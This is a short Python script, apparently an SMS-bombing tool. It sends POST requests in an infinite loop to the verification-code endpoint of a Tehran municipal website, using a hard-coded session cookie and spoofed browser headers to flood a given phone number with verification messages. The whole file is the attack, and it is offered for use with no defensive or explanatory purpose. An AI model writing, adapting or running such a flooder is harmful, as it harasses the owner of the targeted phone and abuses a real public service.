#Made_By_Defalt

import requests
from colorama import Fore

url = "https://manshahrdaram.tehran.ir/SendVerifyCode"

headers = {
    "Host": "manshahrdaram.tehran.ir",
    "Cookie": ".AspNetCore.Antiforgery.8uKDfNyqTyw=CfDJ8Lmev2UBweRHhb6xY9rsIgmduSQYhfxvTXy8DaKYX4tzca0xmTc-pp8ReitXzhMZIL1DGgr3my9h1DL3_GfFH6P8NbIhnUUJMioT1UmkIpc8iijBwAGGxp7O_gEX9kCiXocpeqiH10fE8K5-0cMjANQ",
    "Content-Length": "23",
    "Sec-Ch-Ua": "",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36",
    "Sec-Ch-Ua-Platform": "",
    "Origin": "https://manshahrdaram.tehran.ir",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://manshahrdaram.tehran.ir/Home/ProjectSurvey",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9"
}

while True:
    payload = "phoneNumber=09****"
    response = requests.post(url, data=payload, headers=headers)

    if response.status_code == 200:
        print(Fore.GREEN + "Request sent successfully!")
    else:
        print(Fore.RED + "Error occurred while sending the request.")
